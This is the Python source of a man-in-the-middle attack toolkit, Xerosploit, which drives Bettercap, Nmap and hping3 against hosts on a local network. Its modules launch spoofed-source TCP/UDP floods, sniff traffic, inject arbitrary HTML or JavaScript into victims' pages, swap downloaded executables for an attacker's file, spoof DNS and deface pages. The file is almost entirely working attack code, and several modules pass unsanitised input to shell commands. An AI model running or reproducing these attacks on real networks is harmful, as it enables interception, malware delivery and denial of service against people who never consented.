#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#---------------------------------------------------------------------------#
# This file is part of Xerosploit.                                          #
# Xerosploit is free software: you can redistribute it and/or modify        #
# it under the terms of the GNU General Public License as published by      #
# the Free Software Foundation, either version 3 of the License, or         #
# (at your option) any later version.                                       #
#---------------------------------------------------------------------------#

import os
import sys
import io
import traceback
from time import sleep
from terminaltables import DoubleTable
from tabulate import tabulate
from banner import xe_header

# Python 3 UTF-8 stdout fix (REQUIRED)
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Check if the script is running as root
if os.geteuid() != 0:
    sys.exit("\033[1;91m\n[!] Xerosploit must be run as root.\n\033[1;m")

exit_msg = "\n[++] Shutting down ... Goodbye. ( ^_^)／\n"


def main():
    try:

        def config0():
            global up_interface
            up_interface = open('/opt/xerosploit/tools/files/iface.txt', 'r').read().strip()
            if up_interface == "0":
                up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read().strip()

            global gateway
            gateway = open('/opt/xerosploit/tools/files/gateway.txt', 'r').read().strip()
            if gateway == "0":
                gateway = os.popen(
                    "ip route show | grep -i 'default via' | awk '{print $3}'"
                ).read().strip()

        def home():
            config0()
            n_name = os.popen('iwgetid -r').read()
            n_mac = os.popen(
                "ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -d'/' -f1"
            ).read()
            n_ip = os.popen("hostname -I").read()
            n_host = os.popen("hostname").read()

            print(xe_header())
            print("""
[+]═══════════[ Author : @LionSec1 | Website: www.neodrix.com ]═══════════[+]
                      [ Powered by Bettercap and Nmap ]
""")

            table = [
                ["IP Address", "MAC Address", "Gateway", "Iface", "Hostname"],
                ["", "", "", "", ""],
                [n_ip, n_mac.upper(), gateway, up_interface, n_host]
            ]
            print(tabulate(table, tablefmt="fancy_grid", headers="firstrow"))

            info = [[
                "\nInformation\n",
                "XeroSploit is a penetration testing toolkit\n"
                "designed to perform MITM attacks.\n"
                "Powered by Bettercap and Nmap."
            ]]
            print(DoubleTable(info).table)

        def scan():
            config0()
            scan_data = os.popen(f"nmap {gateway}/24 -n -sP").read()
            open('/opt/xerosploit/tools/log/scan.txt', 'w').write(scan_data)

            devices = os.popen(
                "grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'"
            ).read()
            macs = os.popen(
                "grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'"
            ).read()

            table = [
                ["IP Address", "Mac Address"],
                [devices, macs]
            ]
            print("\n[+] Devices found on your network\n")
            print(DoubleTable(table).table)
            target_ip()

        def target_ip():
            print("\n[+] Enter target IP (or 'all')\n")
            target_ips = input("Xero ➮ ").strip()

            if target_ips == "exit":
                sys.exit(exit_msg)
            elif target_ips == "home":
                home()
            elif target_ips == "all":
                program0("", "All Network")
            else:
                program0(target_ips, target_ips)

        def program0(target_ips, target_name):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print(f"\n[++] Target set: {target_name}\n")

            def option():
                print("\n[+] Choose module (type help)\n")
                cmd = input("Xero»modules ➮ ").strip()

                if cmd == "ping":
                    os.system(f"ping -c 4 {target_ips}")
                    option()

                elif cmd == "pscan":
                    os.system(f"nmap {target_ips} -Pn")
                    option()

                elif cmd == "dos":
                    print("\n[+] Enter type of flooding ( tcp / udp )")
                    flood_type = input("Xero»modules»dos ➮ ").strip()
                    if flood_type == "tcp":
                        os.system(f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source {target_ips}")
                    elif flood_type == "udp":
                        os.system(f"hping3 -2 -c 10000 -d 120 -w 64 --flood --rand-source {target_ips}")
                    else:
                        print("[!] Invalid type")
                    option()

                elif cmd == "sniff":
                    print("\n[+] Sniffing ... (Press CTRL+C to stop)")
                    try:
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --sniffer --sniffer-output /opt/xerosploit/tools/log/sniff.log")
                    except KeyboardInterrupt:
                        pass
                    option()

                elif cmd == "yplay":
                    vid = input("Xero»modules»yplay ➮ Enter Youtube Video ID : ").strip()
                    path = "/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt"
                    iframe = f'<iframe width="0" height="0" src="https://www.youtube.com/embed/{vid}?autoplay=1" frameborder="0" allowfullscreen></iframe>'
                    try:
                        with open(path, 'w') as f:
                            f.write(iframe)
                        print("\n[+] Injecting video ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module rickroll")
                    except Exception as e:
                        print(f"[!] Error: {e}")
                    option()

                elif cmd == "dspoof":
                    img = input("Xero»modules»dspoof ➮ Enter image path : ").strip()
                    img_dir = "/opt/xerosploit/tools/files/images/"
                    if not os.path.exists(img_dir):
                        try:
                            os.makedirs(img_dir)
                        except:
                            pass
                    try:
                        os.system(f"cp '{img}' {img_dir}/ximage.png")
                        print("\n[+] Spoofing images ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module replace_images --httpd --httpd-path {img_dir}")
                    except Exception as e:
                         print(f"[!] Error: {e}")
                    option()

                elif cmd == "injecthtml":
                    content_path = input("Xero»modules»injecthtml ➮ Enter path to HTML file : ").strip()
                    target_path = "/opt/xerosploit/tools/bettercap/modules/tmp/inject_html.txt"
                    try:
                        os.system(f"cp '{content_path}' {target_path}")
                        print("\n[+] Injecting HTML ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module inject_html")
                    except Exception as e:
                        print(f"[!] Error: {e}")
                    option()

                elif cmd == "injectjs":
                    content_path = input("Xero»modules»injectjs ➮ Enter path to JS file : ").strip()
                    target_path = "/opt/xerosploit/tools/bettercap/modules/tmp/inject_js.txt"
                    try:
                        os.system(f"cp '{content_path}' {target_path}")
                        print("\n[+] Injecting JS ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module inject_js")
                    except Exception as e:
                        print(f"[!] Error: {e}")
                    option()

                elif cmd == "rdownload":
                    ext = input("Xero»modules»rdownload ➮ Enter file extension (e.g. exe) : ").strip()
                    file_path = input("Xero»modules»rdownload ➮ Enter path to replacement file : ").strip()
                    print("\n[+] Replacing downloads ... (Press CTRL+C to stop)")
                    os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module replace_file --file-extension '{ext}' --file-replace '{file_path}'")
                    option()

                elif cmd == "deface":
                     print("\n[+] Defacing title ... (Press CTRL+C to stop)")
                     os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module hack_title")
                     option()

                elif cmd == "driftnet":
                    print("\n[+] Capturing images ... (Press CTRL+C to stop)")
                    try:
                        os.system(f"driftnet -i {up_interface}")
                    except KeyboardInterrupt:
                        pass
                    option()

                elif cmd == "dns":
                    host_name = input("Xero»modules»dns ➮ Enter host name (e.g. google.com) : ").strip()
                    ip_address = input("Xero»modules»dns ➮ Enter IP address : ").strip()
                    spoof_file = "/opt/xerosploit/tools/files/spoof.hosts"
                    try:
                        with open(spoof_file, 'w') as f:
                            f.write(f"{ip_address} {host_name}")
                        print("\n[+] Spoofing DNS ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --dns {spoof_file}")
                    except Exception as e:
                         print(f"[!] Error: {e}")
                    option()

                elif cmd == "play":
                    audio_url = input("Xero»modules»play ➮ Enter Audio URL : ").strip()
                    path = "/opt/xerosploit/tools/bettercap/modules/tmp/play.txt"
                    try:
                        with open(path, 'w') as f:
                            f.write(audio_url)
                        print("\n[+] Playing audio ... (Press CTRL+C to stop)")
                        os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module play")
                    except Exception as e:
                         print(f"[!] Error: {e}")
                    option()
                
                elif cmd == "move":
                     print("\n[+] Shaking screen ... (Press CTRL+C to stop)")
                     path = "/opt/xerosploit/tools/bettercap/modules/tmp/inject_js.txt"
                     try:
                         # Read built-in shakescreen.js and copy to tmp
                         shake_js = open("/opt/xerosploit/tools/bettercap/modules/js/shakescreen.js", "r").read()
                         with open(path, "w") as f:
                             f.write(shake_js)
                         os.system(f"bettercap -I {up_interface} -T {target_ips} --proxy --proxy-module inject_js")
                     except Exception as e:
                         print(f"[!] Error: {e}")
                     option()

                elif cmd == "exit":
                    sys.exit(exit_msg)

                elif cmd == "help":
                    modules = [[
                        "Modules",
                        "ping\npscan\ndos\nsniff\ninjecthtml\ninjectjs\nrdownload\ndspoof\nyplay\ndeface\ndriftnet\ndns\nplay\nmove"
                    ]]
                    print(DoubleTable(modules).table)
                    option()
                else:
                    print("[!] Unknown module")
                    option()

            option()

        def cmd0():
            while True:
                cmd = input("\nXero ➮ ").strip()
                if cmd == "scan":
                    scan()
                elif cmd == "start":
                    target_ip()
                elif cmd == "home":
                    home()
                elif cmd == "exit":
                    sys.exit(exit_msg)
                elif cmd == "help":
                    cmds = [[
                        "Commands",
                        "scan\nstart\niface\ngateway\nrmlog\nexit"
                    ]]
                    print(DoubleTable(cmds).table)
                else:
                    print("[!] Command not found")

        home()
        cmd0()

    except KeyboardInterrupt:
        print(exit_msg)
        sleep(1)
    except Exception:
        traceback.print_exc()

    sys.exit(0)


if __name__ == "__main__":
    main()
